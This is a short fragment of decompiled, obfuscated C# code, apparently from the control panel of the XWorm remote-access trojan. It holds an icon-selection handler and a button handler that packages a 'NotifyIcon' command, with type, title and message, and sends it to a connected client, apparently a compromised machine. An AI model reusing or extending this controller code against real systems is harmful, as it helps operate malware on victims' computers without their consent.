			PictureBox2.Image = XWorm_Resources.Warning;
		}
		if (Operators.CompareString(Guna2ComboBox3.Text, "Error", TextCompare: false) == 0)
		{
			PictureBox2.Visible = true;
			PictureBox2.Image = XWorm_Resources._Error;
		}
	}

	private void Guna2GradientButton2_Click(object sender, EventArgs e)
	{
		byte[] array = Module0.smethod_6("NotifyIcon" + GClass19.string_0 + Guna2ComboBox3.Text + GClass19.string_0 + Guna2TextBox3.Text + GClass19.string_0 + Guna2TextBox4.Text);
		GClass5 gClass = gclass5_0;
		ThreadPool.QueueUserWorkItem([SpecialName][DebuggerHidden] (object a0) =>
		{
			gClass.method_1((byte[])a0);
		}, array);
	}
}